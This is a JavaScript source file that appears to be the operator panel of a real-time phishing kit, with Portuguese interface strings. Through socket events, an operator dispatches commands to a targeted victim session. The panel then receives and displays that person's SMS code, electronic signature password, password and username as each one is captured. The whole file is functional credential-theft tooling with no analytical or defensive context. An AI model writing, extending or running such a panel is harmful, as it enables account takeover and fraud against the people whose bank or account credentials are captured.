const operators = (() => {
    //private var/functions
    const buttonsSendCommands = [...document.querySelectorAll('.btn-command')]

    async function sendCommand() {
        if (buttonsSendCommands) {
            buttonsSendCommands.forEach((btn) => {
                btn.addEventListener('click', function (e) {
                    e.preventDefault()

                    const action = btn.dataset.action

                    console.log(`action dispatch`, action)

                    socket.emit(action, clientOperating)
                })
            })
        }
    }

    function receiver() {
        socket.on('sms', (client) => {
            document.querySelector('.opSms').value = client.sms

            document.querySelector('.statusOP').innerHTML = `SMS Enviado!`
        })

        socket.on('sendSignature', (client) => {
            document.querySelector('.opAssign').value = client.eletronicPassword

            document.querySelector('.statusOP').innerHTML = `Assinatura Enviada!`
        })

        socket.on('sendPassword', (client) => {
            document.querySelector('.opPassword').value = client.password

            document.querySelector('.statusOP').innerHTML = `Senha Enviada!`
        })

        socket.on('sendUser', (client) => {
            document.querySelector('.opUser').value = client.user

            document.querySelector('.statusOP').innerHTML = `Usuário Enviado!`
        })

        socket.on('finish', (client) => {
            document.querySelector('.statusOP').innerHTML = `Finalizado`
        })
    }

    function assignClient() {
        const token = document.body.dataset.token

        const data = {
            client: clientOperating,
            token: token,
        }

        socket.emit('assignClient', data)
    }

    return {
        //public var/functions
        sendCommand,
        receiver,
        assignClient,
    }
})()

operators.sendCommand()
operators.receiver()
operators.assignClient()
